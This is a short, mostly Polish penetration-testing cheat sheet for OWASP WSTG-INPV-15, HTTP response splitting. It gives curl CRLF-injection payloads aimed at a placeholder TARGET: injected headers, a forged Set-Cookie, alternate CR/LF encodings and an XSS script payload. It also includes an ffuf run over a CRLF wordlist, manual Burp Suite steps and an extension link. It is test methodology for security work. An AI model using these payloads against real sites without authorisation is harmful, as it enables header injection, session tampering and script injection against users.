# WSTG-INPV-15 — Testing for HTTP Response Splitting

## Cele

- Identify user-controlled input reflected into HTTP response headers
- Assess whether CR/LF characters can be injected into response headers

## KOMENDY

### CRLF Injection podstawowe

```bash
curl -v "https://TARGET/redirect?url=http://target.com%0d%0aInjected-Header:true"
curl -v "https://TARGET/redirect?url=http://target.com%0d%0a%0d%0a<html>injected</html>"
curl -v "https://TARGET/page?lang=en%0d%0aSet-Cookie:hacked=true"

```

### Rozne enkodowania CRLF

```bash
curl -v "https://TARGET/redirect?url=%0d%0a"
curl -v "https://TARGET/redirect?url=%0D%0A"
curl -v "https://TARGET/redirect?url=%E5%98%8D%E5%98%8A"
curl -v "https://TARGET/redirect?url=\r\n"

```

### XSS via CRLF

```bash
curl -v "https://TARGET/redirect?url=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings CRLF payloads

```bash
ffuf -u "https://TARGET/redirect?url=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/CRLF Injection/Files/crlfinjection.txt" -mc all -o output_ffuf_crlf.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj parametry odbijane w naglowkach HTTP (Location, Set-Cookie)
2. Wstaw %0d%0a i sprawdz czy nowy naglowek sie pojawia
3. Testuj rozne enkodowania CR/LF
4. Sprawdz mozliwosc cache poisoning via CRLF
5. Testuj XSS via response splitting


---

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| HTTP Request Smuggler | Skanowanie i eksploatacja HTTP Request Smuggling (CL.TE, TE.CL) | [GitHub](https://github.com/portswigger/http-request-smuggler) |
